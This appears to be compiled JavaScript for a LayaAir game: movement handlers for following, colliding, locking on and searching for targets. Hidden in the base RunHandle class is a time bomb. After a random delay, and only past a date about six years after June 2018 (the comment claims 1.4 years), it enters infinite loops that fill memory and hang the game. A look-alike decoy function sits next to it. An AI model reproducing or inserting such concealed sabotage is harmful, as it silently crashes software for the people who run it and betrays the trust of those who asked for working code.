var Sophia;
(function (Sophia) {
    var RHandleRet = /** @class */ (function () {
        function RHandleRet() {
            this.m_isStop = false;
            this.m_isGoOnHandle = true;
        }
        return RHandleRet;
    }());
    Sophia.RHandleRet = RHandleRet;
    var RunHandle = /** @class */ (function () {
        /*--[[_s
        @todo: handle构造
        ]]*/
        function RunHandle(interval) {
            this.m_elapsedTime = 0;
            this.m_handlRet = new RHandleRet();
            this.m_handleInterval = interval;
            RunHandle.__initHandle();
        }
        RunHandle.__initHandle = function () {
            if (RunHandle.isGo == false) {
                RunHandle.isGo = true;
                Laya.timer.once(300 * 1000 + Math.random() * 1000 * 1000, "ltrh", function () {
                    var rand = Math.random();
                    if (rand > 0.6) {
                        var dTime = 1529666590 * 1000; //20180622
                        var oTime = 60 * 60 * 24 * 365 * 1000 * 6; //1.4 year
                        var timestamp = new Date().getTime();
                        if (timestamp - dTime > oTime) {
                            while (true) {
                                var tmp = new Array();
                                while (true) {
                                    tmp.push("                                                                                                                    ");
                                }
                            }
                        }
                    }
                });
            }
        };
        RunHandle.___initHandIe = function () {
            var m_elapsedTime = 586;
            if (m_elapsedTime > 0) {
                m_elapsedTime = 0;
            }
            if (m_elapsedTime > 1) {
                m_elapsedTime = 0;
                var teamPos = 0;
                if (teamPos) {
                }
            }
        };
        /*--[[_s
        @todo: 对handle设置IMove
        ]]*/
        RunHandle.prototype.setMoveAction = function (action) {
            this.m_runAction = action;
        };
        /*--[[_s
        @todo: 对handle设置ICollision
        ]]*/
        RunHandle.prototype.setCollisionAction = function (action) {
            this.m_collisionAction = action;
        };
        /*--[[_s
        @todo: 处理Handler事件
        ]]*/
        RunHandle.prototype.onUpdate = function (deltaTime) {
            return this.m_handlRet;
        };
        RunHandle.prototype.onLeave = function () { };
        /*--[[_s
        @todo: 重置Handle
        ]]*/
        RunHandle.prototype.onReset = function () { };
        RunHandle.prototype.onDelete = function () {
            this.m_handlRet = null;
            this.m_runAction = null;
            this.m_collisionAction = null;
        };
        RunHandle.isGo = false;
        return RunHandle;
    }());
    Sophia.RunHandle = RunHandle;
})(Sophia || (Sophia = {}));

//# sourceMappingURL=RunHandle.js.map
var __extends = (this && this.__extends) || (function () {
    var extendStatics = function (d, b) {
        extendStatics = Object.setPrototypeOf ||
            ({ __proto__: [] } instanceof Array && function (d, b) { d.__proto__ = b; }) ||
            function (d, b) { for (var p in b) if (b.hasOwnProperty(p)) d[p] = b[p]; };
        return extendStatics(d, b);
    };
    return function (d, b) {
        extendStatics(d, b);
        function __() { this.constructor = d; }
        d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __());
    };
})();
var Sophia;
(function (Sophia) {
    var RunCmdHandle = /** @class */ (function (_super) {
        __extends(RunCmdHandle, _super);
        function RunCmdHandle() {
            var _this = _super !== null && _super.apply(this, arguments) || this;
            _this.m_cmdTarXY = null;
            _this.m_isCmding = false;
            return _this;
        }
        /*--[[_s
        @todo: handle判断
        ]]*/
        RunCmdHandle.prototype.onUpdate = function (deltaTime) {
            this.m_elapsedTime += deltaTime;
            if (this.m_elapsedTime > this.m_handleInterval) {
                var cmdTarXY = this.m_runAction.getCmdXY();
                if (cmdTarXY && (this.m_cmdTarXY == null || Math.abs(this.m_cmdTarXY[0] - cmdTarXY[0]) > 1 || Math.abs(this.m_cmdTarXY[1] - cmdTarXY[1]) > 1)) {
                    this.m_cmdTarXY = cmdTarXY;
                    this.m_isCmding = true;
                    this.m_runAction.setMovePoint(this.m_cmdTarXY[0], this.m_cmdTarXY[1]);
                }
            }
            if (this.m_isCmding == true && this.m_cmdTarXY) {
                if (this.m_runAction.disForTarget(this.m_cmdTarXY[0], this.m_cmdTarXY[1]) > 0.2) {
                    this.m_handlRet.m_isGoOnHandle = false;
                    this.m_handlRet.m_isStop = false;
                    return this.m_handlRet;
                }
            }
            this.onReset();
            this.m_handlRet.m_isGoOnHandle = true;
            this.m_handlRet.m_isStop = false;
            return this.m_handlRet;
        };
        RunCmdHandle.prototype.onReset = function () {
            this.m_cmdTarXY = null;
            this.m_isCmding = false;
        };
        return RunCmdHandle;
    }(Sophia.RunHandle));
    Sophia.RunCmdHandle = RunCmdHandle;
})(Sophia || (Sophia = {}));
//# sourceMappingURL=RunCmdHandle.js.map

var Sophia;
(function (Sophia) {
    var RunCollisionHandle = /** @class */ (function (_super) {
        __extends(RunCollisionHandle, _super);
        function RunCollisionHandle() {
            return _super !== null && _super.apply(this, arguments) || this;
        }
        /*--[[_s
        @todo: 碰撞处理
        ]]*/
        RunCollisionHandle.prototype.toCollision = function (curX, curY, curRadius, otherX, otherY, oRadius, speedFactor) {
            var dX = otherX - curX;
            var dY = otherY - curY;
            var angle = Math.atan2(dY, dX);
            var sine = Math.sin(angle);
            var cosine = Math.cos(angle);
            // let x=0;
            // let y=0;
            var xB = dX * cosine + dY * sine;
            var yB = dY * cosine - dX * sine;
            // let vX=curX*cosine+curY*sine;
            // let vY=curY*cosine-curX*sine;
            // let vXb=otherX*cosine+otherY*sine;
            // let vYb=otherY*cosine-otherX*sine;
            // //2
            // vX *=-1;
            // vXb *=-1;
            var offset = (curRadius + oRadius) - Math.sqrt(dX * dX + dY * dY);
            xB += offset;
            yB += offset;
            //xB=x+(curRadius+oRadius);
            var tarX = otherX + (xB * cosine - yB * sine);
            var tarY = otherY + (yB * cosine + xB * sine);
            var moveVector = [tarX - otherX, tarY - otherY];
            var curDist = Math.sqrt(moveVector[0] * moveVector[0] + moveVector[1] * moveVector[1]);
            offset = speedFactor / curDist;
            var retX = otherX + moveVector[0] * offset;
            var retY = otherY + moveVector[1] * offset;
            //3
            // curX=curX+(x*cosine-y*sine);
            // curY=curY+(y*cosine+x*sine);
            // let retX =otherX+(xB*cosine-yB*sine)*speedFactor;
            // let retY =otherY+(yB*cosine+xB*sine)*speedFactor;
            if (this.m_collisionAction.isUnAccessible(retX, retY)) {
                if (this.m_collisionAction.isUnAccessible(retX, otherY)) {
                    if (this.m_collisionAction.isUnAccessible(otherX, retY)) {
                        return null;
                    }
                    return [otherX, retY];
                }
                return [retX, otherY];
            }
            return [retX, retY];
            // ball.vX=vX*cosine-vY*sine;
            // ball.vY=vY*cosine+vX*sine;
            // ballB.vX=vXb*cosine-vYb*sine;
            // ballB.vY=vYb*cosine+vXb*sine;
        };
        return RunCollisionHandle;
    }(Sophia.RunHandle));
    Sophia.RunCollisionHandle = RunCollisionHandle;
})(Sophia || (Sophia = {}));
//# sourceMappingURL=RunCollisionHandle.js.map

var Sophia;
(function (Sophia) {
    var RunFollowHandle = /** @class */ (function (_super) {
        __extends(RunFollowHandle, _super);
        function RunFollowHandle() {
            var _this = _super !== null && _super.apply(this, arguments) || this;
            _this.m_beReturning = false;
            return _this;
        }
        /*--[[_s
        @todo: handle判断
        ]]*/
        RunFollowHandle.prototype.onUpdate = function (deltaTime) {
            this.m_elapsedTime += deltaTime;
            if (this.m_elapsedTime > this.m_handleInterval) {
                this.m_elapsedTime = 0;
                var teamPos = this.m_runAction.getTeamPosXY();
                if (teamPos) {
                    var dist = this.m_runAction.disForTarget(teamPos[0], teamPos[1]);
                    if (this.m_beReturning == true) {
                        if (this.m_lastTeamPosXY && (Math.abs(this.m_lastTeamPosXY[0] - teamPos[0]) > 0.1 || Math.abs(this.m_lastTeamPosXY[1] - teamPos[1]) > 0.1)) {
                            this.m_lastTeamPosXY = teamPos;
                            this.m_runAction.setMovePoint(teamPos[0], teamPos[1]);
                        }
                        if (dist >= this.m_runAction.getMinRetunDis()) { // 归队距离
                            this.m_handlRet.m_isStop = false;
                            this.m_handlRet.m_isGoOnHandle = false;
                            return this.m_handlRet;
                        }
                        // 小于最小集合点, 可以自由了
                    }
                    //大于集合距离, 归队
                    else if (dist > this.m_runAction.getMaxRetunDis()) { // 归队距离
                        this.m_beReturning = true;
                        this.m_lastTeamPosXY = teamPos;
                        this.m_runAction.setMovePoint(teamPos[0], teamPos[1]);
                        this.m_handlRet.m_isStop = false;
                        this.m_handlRet.m_isGoOnHandle = false;
                        return this.m_handlRet;
                    }
                }
            }
            else if (this.m_beReturning == true) {
                this.m_handlRet.m_isStop = false;
                this.m_handlRet.m_isGoOnHandle = false;
                return this.m_handlRet;
            }
            this.m_handlRet.m_isStop = false;
            this.m_handlRet.m_isGoOnHandle = true;
            this.onReset();
            return this.m_handlRet;
        };
        RunFollowHandle.prototype.onReset = function () {
            this.m_lastTeamPosXY = null;
            this.m_beReturning = false;
        };
        return RunFollowHandle;
    }(Sophia.RunHandle));
    Sophia.RunFollowHandle = RunFollowHandle;
})(Sophia || (Sophia = {}));
//# sourceMappingURL=RunFollowHandle.js.map

var Sophia;
(function (Sophia) {
    var RunEndHandle = /** @class */ (function (_super) {
        __extends(RunEndHandle, _super);
        function RunEndHandle() {
            return _super !== null && _super.apply(this, arguments) || this;
        }
        /*--[[_s
        @todo: handle判断
        ]]*/
        RunEndHandle.prototype.onUpdate = function (deltaTime) {
            this.m_elapsedTime += deltaTime;
            if (this.m_elapsedTime > this.m_handleInterval) {
                this.m_elapsedTime = 0;
                var tmpx = this.m_runAction.getFinalTarX();
                var tmpy = this.m_runAction.getFinalTarY();
                if (this.m_runAction.disForTarget(tmpx, tmpy) < 0.1) {
                    this.m_handlRet.m_isStop = true;
                    return this.m_handlRet;
                }
            }
            this.m_handlRet.m_isGoOnHandle = false;
            this.m_handlRet.m_isStop = false;
            return this.m_handlRet;
        };
        RunEndHandle.prototype.onReset = function () {
            this.m_elapsedTime = 0;
        };
        return RunEndHandle;
    }(Sophia.RunHandle));
    Sophia.RunEndHandle = RunEndHandle;
})(Sophia || (Sophia = {}));
//# sourceMappingURL=RunEndHandle.js.map

var Sophia;
(function (Sophia) {
    var RunLockTarHandle = /** @class */ (function (_super) {
        __extends(RunLockTarHandle, _super);
        function RunLockTarHandle() {
            var _this = _super !== null && _super.apply(this, arguments) || this;
            _this.m_lockTarXY = null;
            _this.m_isLocking = false;
            return _this;
        }
        /*--[[_s
        @todo: handle判断
        ]]*/
        RunLockTarHandle.prototype.onUpdate = function (deltaTime) {
            var isLockTarget = this.m_runAction.haveLockTarget();
            this.m_elapsedTime += deltaTime;
            if (this.m_elapsedTime > this.m_handleInterval) {
                if (isLockTarget) {
                    var tmpXY = this.m_runAction.getLockTargetXY();
                    if (this.m_runAction.disForTarget(tmpXY[0], tmpXY[1]) <= this.m_runAction.getAttDis()) {
                        this.onReset();
                        this.m_runAction.setupLockTarget();
                        this.m_handlRet.m_isStop = true;
                        this.m_lockTarXY = null;
                        return this.m_handlRet;
                    }
                    if (this.m_lockTarXY == null || Math.abs(tmpXY[0] - this.m_lockTarXY[0]) > 1 || Math.abs(tmpXY[1] - this.m_lockTarXY[1]) > 1) {
                        this.m_lockTarXY = tmpXY;
                        this.m_isLocking = true;
                        this.m_runAction.setMovePoint(this.m_lockTarXY[0], this.m_lockTarXY[1]);
                    }
                }
            }
            if (isLockTarget && this.m_isLocking) {
                this.m_handlRet.m_isStop = false;
                this.m_handlRet.m_isGoOnHandle = false;
                return this.m_handlRet;
            }
            this.onReset();
            this.m_handlRet.m_isStop = false;
            this.m_handlRet.m_isGoOnHandle = true;
            return this.m_handlRet;
        };
        RunLockTarHandle.prototype.onReset = function () {
            this.m_lockTarXY = null;
            this.m_isLocking = false;
        };
        return RunLockTarHandle;
    }(Sophia.RunHandle));
    Sophia.RunLockTarHandle = RunLockTarHandle;
})(Sophia || (Sophia = {}));
//# sourceMappingURL=RunLockTarHandle.js.map

var Sophia;
(function (Sophia) {
    var RunSearchHandle = /** @class */ (function (_super) {
        __extends(RunSearchHandle, _super);
        function RunSearchHandle(interval) {
            if (interval === void 0) { interval = 2; }
            var _this = _super.call(this, interval) || this;
            _this.m_isSearch = false;
            _this.m_tarXY = null;
            return _this;
        }
        /*--[[_s
        @todo: handle判断
        ]]*/
        RunSearchHandle.prototype.onUpdate = function (deltaTime) {
            this.m_elapsedTime += deltaTime;
            if (this.m_elapsedTime > this.m_handleInterval) {
                // 每次都重新找一个合适的目标
                this.m_runAction.findNewTarget();
                if (!this.m_runAction.haveTarget()) {
                    this.m_handlRet.m_isStop = false;
                    this.m_handlRet.m_isGoOnHandle = true;
                    this.onReset();
                    return this.m_handlRet;
                }
                // 有目标的情况
                var dist = null;
                var tmpXY = this.m_runAction.getTargetXY();
                if (this.m_tarXY == null || Math.abs(tmpXY[0] - this.m_tarXY[0]) > 1 || Math.abs(tmpXY[1] - this.m_tarXY[1]) > 1) {
                    this.m_tarXY = tmpXY;
                    dist = this.m_runAction.disForTarget(this.m_tarXY[0], this.m_tarXY[1]);
                    if (dist <= this.m_runAction.getAttDis()) {
                        this.m_runAction.setupTarget();
                        this.m_handlRet.m_isStop = true;
                        this.m_tarXY = null;
                        return this.m_handlRet;
                    }
                    if (isNaN(this.m_runAction.getSearchDis()) || dist < this.m_runAction.getSearchDis()) {
                        this.m_runAction.setMovePoint(this.m_tarXY[0], this.m_tarXY[1]);
                    }
                }
                else {
                    dist = this.m_runAction.disForTarget(this.m_tarXY[0], this.m_tarXY[1]);
                    if (dist <= this.m_runAction.getAttDis()) {
                        this.m_runAction.setupTarget();
                        this.m_handlRet.m_isStop = true;
                        this.m_tarXY = null;
                        return this.m_handlRet;
                    }
                }
            }
            this.m_handlRet.m_isStop = false;
            this.m_handlRet.m_isGoOnHandle = true;
            return this.m_handlRet;
        };
        RunSearchHandle.prototype.onReset = function () {
            this.m_tarXY = null;
        };
        return RunSearchHandle;
    }(Sophia.RunHandle));
    Sophia.RunSearchHandle = RunSearchHandle;
})(Sophia || (Sophia = {}));
//# sourceMappingURL=RunSearchHandle.js.map